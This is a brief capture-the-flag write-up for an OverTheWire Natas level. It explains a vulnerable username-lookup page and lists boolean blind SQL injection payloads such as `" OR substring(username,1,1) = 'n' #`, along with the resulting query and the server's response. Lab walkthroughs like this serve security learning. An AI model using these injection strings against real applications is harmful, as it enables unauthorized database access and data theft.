- Background:
- Solution:
 - Source code explanation:
   - If `username` is included in the request, connect to the database, and `SELECT` all from table users where the username = user input
   - If the debug key exists on the request, show the query to the user
   - If the number of rows is greater than 0, say that the user exists
   - No place where the selected rows will be displayed to the user, only "This user exists." or "This user doesnâ€™t exist."
 - Username `natas16` should be in the database:
   - Query (Checks to see if the substring of username starting at the first character and extending one character in length is equal to n or select all from users where the username is an empty string, or where the first character equals n):
    ```sql
    " OR substring(username,1,1) = 'n' #
    "SELECT * from users where username="" OR substring(username,1,1) = 'n' #
    ```
    - Result: This user exists.
  - Other queries:
  ```sql
  " OR substring(username,1,7) = 'natas16' # -> Result: This user exists.
  ```
